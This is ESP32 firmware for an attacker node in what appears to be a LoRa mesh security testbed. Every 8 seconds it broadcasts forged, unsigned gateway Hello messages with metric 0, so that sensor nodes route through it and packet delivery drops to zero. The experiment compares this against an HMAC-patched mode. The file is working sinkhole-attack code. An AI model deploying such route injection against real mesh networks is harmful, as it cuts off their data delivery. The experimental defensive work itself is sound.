// E6 — Node C: ATTACKER
// Role: Broadcasts forged Hello(metric=0) claiming to BE the gateway.
//       Targets all sensor nodes (A, R1, R2, R3) simultaneously.
//
// In SECURITY_MODE 0 (baseline): forged Hellos are accepted → all nodes
//   route data through the attacker → Gateway receives 0 packets (PDR=0%)
// In SECURITY_MODE 1 (patched):  forged Hellos are rejected (HMAC FAILED)
//   → all nodes keep legitimate routes → PDR maintained
//
// Board: Ebyte EoRa PI (ESP32-S3FH4R2)  FQBN: esp32:esp32:esp32s3:CDCOnBoot=cdc

#define NODE_ID          0xCC
#define GATEWAY_ID       0xBB
#define ATTACK_PERIOD_MS  8000   // inject every 8s (before Gateway's 10s Hello)

#include "../e6_common.h"
#include <Wire.h>
#include "SSD1306Wire.h"

SSD1306Wire oled(0x3c, 18, 17);

SPIClass spi(FSPI);
Module*  mod   = nullptr;
SX1262*  radio = nullptr;

volatile bool rxFlag = false;
void IRAM_ATTR onDio1() { rxFlag = true; }

uint16_t atk_seq    = 0;
uint32_t atk_count  = 0;
uint32_t last_atk   = 0;
uint32_t last_oled  = 0;

void oled_draw() {
  oled.clear();
  oled.setFont(ArialMT_Plain_10);
  oled.setTextAlignment(TEXT_ALIGN_LEFT);
  oled.drawString(0,  0, "NODE C  ATTACKER");
  char buf[32];
  snprintf(buf, sizeof(buf), "INJECT cnt=%lu", atk_count);
  oled.drawString(0, 14, buf);
  oled.drawString(0, 28, "metric=0 (fake GW)");
  oled.drawString(0, 42, "Expect: all nodes");
  oled.display();
}

void inject_hello() {
  // Forge Hello claiming to be the gateway with metric=0 (best possible)
  // No HMAC — in baseline mode nodes accept this; in patched mode they reject it.
  HelloMsg h = {};
  h.type   = MSG_HELLO;
  h.src    = NODE_ID;    // 0xCC — clearly the attacker (not spoofing GW src)
  h.dst_gw = GATEWAY_ID;
  h.metric = 0;          // claim metric=0: "I AM the gateway"
  h.seq    = atk_seq++;
  // Intentionally NOT signing — HMAC field is zero
  radio->transmit((uint8_t*)&h, sizeof(h));
  radio->startReceive();
  atk_count++;
  Serial.printf("[ATTACK] Injected Hello src=0xCC metric=0 seq=%u (#%lu)\n",
                h.seq, atk_count);
  Serial.println("[ATTACK] Baseline: all nodes will route to 0xCC (PDR=0%)");
  Serial.println("[ATTACK] Patched:  all nodes reject HMAC FAILED");
}

void setup() {
  Serial.begin(115200);
  delay(500);
  Serial.println("\n=== E6 Node C (ATTACKER) ===");
  Serial.println("[INFO] Broadcasting forged Hello(metric=0) every 8s");
  Wire.begin(18, 17);
  oled.init(); oled.flipScreenVertically();
  oled_draw();

  eora_radio_init();
  spi.begin(LORA_SCK, LORA_MISO, LORA_MOSI, LORA_NSS);
  mod   = new Module(LORA_NSS, LORA_DIO1, LORA_RST, LORA_BUSY, spi);
  radio = new SX1262(mod);
  int st = radio->begin(LORA_FREQ, LORA_BW, LORA_SF, LORA_CR,
                        LORA_SYNC, LORA_POWER, 8, LORA_TCXO);
  if (st != RADIOLIB_ERR_NONE) {
    Serial.printf("[ERR] Radio init: %d\n", st); while (true) delay(1000);
  }
  radio->setDio1Action(onDio1);
  radio->startReceive();
  Serial.println("[RADIO] SX1262 ready @ 923 MHz AS923");
}

void loop() {
  uint32_t now = millis();
  if (now - last_atk  >= ATTACK_PERIOD_MS) { last_atk = now; inject_hello(); }
  if (now - last_oled >= 5000)             { last_oled = now; oled_draw(); }
}
